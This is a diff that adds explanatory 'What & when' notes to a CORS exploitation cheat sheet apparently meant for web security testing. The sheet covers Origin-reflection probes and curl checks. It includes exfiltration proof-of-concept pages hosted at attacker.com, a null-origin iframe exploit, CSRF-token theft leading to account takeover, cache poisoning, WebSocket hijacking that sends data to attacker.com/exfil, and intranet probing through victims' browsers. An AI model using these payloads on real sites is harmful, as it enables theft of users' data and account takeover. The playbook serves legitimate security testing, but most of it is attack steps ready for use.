@@ -8,6 +8,8 @@
 
 ## 1. Origin values to fire (map the ACAO logic — Guide §5)
 
+*What & when:* your first move on any CORS-enabled endpoint — fire this battery of different `Origin` headers to learn *how the server decides who's trusted*. The pattern of which ones come back reflected tells you the rule (reflect-any / null / endsWith / regex / etc.) and therefore which bypass you need next.
+
 Send each as the `Origin:` request header; record the returned `Access-Control-Allow-Origin` + `Access-Control-Allow-Credentials`.
 
 ```
@@ -63,6 +65,8 @@ Origin: https://target.com@evil.com               (userinfo)
 
 ## 2. Fast curl probes
 
+*What & when:* the quick command-line version of section 1 — use to *detect the condition* fast across endpoints. Remember curl proves only the **header** (it ignores the browser's same-origin rules); a real finding still needs the browser `fetch()` PoC in section 3.
+
 ```bash
 T=https://api.target.com/api/me
 
@@ -94,6 +98,8 @@ access-control-allow-credentials: true
 ---
 
 ## 3. The credentialed-read exfil PoC (the actual exploit — Guide §11)
+
+*What & when:* **this is the real exploit** (curl only shows the condition). Host this on an origin you control, visit it while logged into the target as your own test account, and it reads your account's secret cross-origin and ships it to your collector — proving a browser genuinely reads the credentialed response. Use for reflect-any and any bypass origin.
 
 ```html
 <!-- attacker.com/exfil.html  — victim is logged into target.com in the same browser -->
@@ -129,6 +135,8 @@ x.send();
 
 ## 4. `null`-origin exploit via sandboxed iframe (Guide §7)
 
+*What & when:* use when the server trusts `Origin: null` + credentials. A sandboxed iframe (no `allow-same-origin`) runs with origin `null`, so this page *becomes* `null` and reads the victim's data — exploitable from any site, which is why "allow null" is as bad as reflect-any.
+
 ```html
 <!-- attacker.com/null.html — the sandboxed iframe's document has Origin: null -->
 <!DOCTYPE html><html><body>
@@ -151,6 +159,8 @@ x.send();
 ---
 
 ## 5. CSRF-token theft → state change (Guide §13)
+
+*What & when:* use when the app is CSRF-protected by a token that happens to sit in a CORS-readable endpoint. Read the victim's CSRF token cross-origin, then replay it in a forged state-changing request — turning a read-only CORS bug into an email/password change → ATO.
 
 ```html
 <script>
@@ -224,6 +234,9 @@ endsWith("target.com")            → https://nottarget.com  ·  https://eviltar
 ---
 
 ## 7c. Pre-flight testing & custom-header / write exploitation (Guide §10.2 / §13.2)
+
+*What & when:* use when you need more than a simple GET read — a credentialed **write** (`PUT`/`DELETE`/JSON), a read of a **custom-header-gated** endpoint, or a secret that lives in a **response header**. All of those are "non-simple," so they only work if the preflight (`OPTIONS`) permits your origin + method + headers. Probe it first; a permissive preflight = full cross-origin read *and* write.
+
 ```bash
 T=https://api.target.com/api/account
 # does the preflight permit custom headers + write methods for my origin?
@@ -258,6 +271,9 @@ fetch('https://api.target.com/api/keys',{credentials:'include',headers:{'X-Api-K
 > Simple credentialed **GET** of a returned JSON body needs **no** preflight; you only need a permissive preflight for custom-header reads, JSON/PUT/DELETE writes, or reading secret **response headers** (Expose-Headers).
 
 ## 7d. CORS response cache poisoning probe (missing `Vary: Origin`) (Guide §10.4)
+
+*What & when:* use when a reflected-ACAO response is **cacheable** (CDN/proxy) and lacks `Vary: Origin`. The cache then stores your-origin's ACAO and serves it to *everyone* — poisoning it so all users trust your origin (mass theft) or so the real frontend's CORS breaks (DoS). Prove on a benign/unique key.
+
 ```bash
 T=https://target.com/api/config
 # 1) inject origin, check it's reflected AND cacheable AND no Vary: Origin:
@@ -269,6 +285,9 @@ curl -s -D - -o /dev/null "$T" | grep -i 'access-control-allow-origin'
 ```
 
 ## 7e. Cross-Site WebSocket Hijacking (CSWSH) — WS ignores CORS/SOP (Guide §13.3)
+
+*What & when:* test every WebSocket endpoint — CORS doesn't protect them, so if the socket is cookie-authenticated and its handshake doesn't check `Origin`, your page opens a fully logged-in connection to the victim's live stream. Confirm by replaying the handshake with a foreign `Origin`; a 101 upgrade that still works authenticated = CSWSH.
+
 ```bash
 # test: replay the WS handshake with a foreign Origin — does the authenticated upgrade still succeed?
 #   (Burp Repeater WS, or wscat with a forged Origin header). 101 Switching Protocols + works authed = CSWSH.
@@ -284,6 +303,9 @@ ws.onmessage = e  => navigator.sendBeacon('https://attacker.com/exfil', e.data);
 > Vulnerable when the WS endpoint is **cookie-authenticated** and the handshake **doesn't validate `Origin`**. Fix = validate Origin on the handshake + per-connection CSRF token.
 
 ## 7f. Private Network Access (PNA) — public page → intranet/localhost (Guide §10.5)
+
+*What & when:* use when you can make a victim's browser reach an **internal** service (router/IoT/localhost dev server). Modern browsers gate public→private requests behind a PNA preflight; if the internal device answers `Access-Control-Allow-Private-Network: true` with a permissive ACAO, a public web page can read and drive that intranet box through the victim's browser. If PNA isn't granted, pivot to DNS rebinding (SSRF kit).
+
 ```bash
 # does the internal device grant PNA? (preflight carries Access-Control-Request-Private-Network: true)
 curl -s -i 'http://192.168.1.1/' -X OPTIONS \
